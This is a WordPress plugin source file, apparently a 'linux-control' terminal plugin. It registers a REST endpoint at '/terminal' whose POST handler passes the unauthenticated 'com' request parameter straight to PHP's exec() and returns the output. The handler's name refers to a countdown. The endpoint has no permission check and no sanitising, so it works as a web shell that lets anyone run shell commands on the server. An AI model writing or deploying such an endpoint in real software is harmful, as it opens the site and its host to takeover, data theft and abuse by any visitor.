<?php 
$version = 1;
$namespace = 'ntalam-linux-control/v'.$version ;

add_action( 'rest_api_init', function () {
  global $namespace;
  register_rest_route( $namespace , '/terminal', array(
    'methods' => 'GET',
    'callback' => 'get_posts_ntalam_countdown',
  ) );
  register_rest_route( $namespace, '/terminal', array(
    'methods' => 'POST',
    'callback' => 'post_terminal_ntalam_countdown',
  ) );
} );


function get_posts_ntalam_countdown( $data ) {
  $tag = $data['tag'];
  $args = array(
    'post_type' => 'post',
    'tag' => $tag,
  );
  $query = new WP_Query( $args );
  $posts = $query->get_posts();
  return $posts;
}    
function post_terminal_ntalam_countdown( $data ) {
    $ret = exec($data->get_param( 'com' ), $output, $retval);
      return print_r($output) . $ret;
}
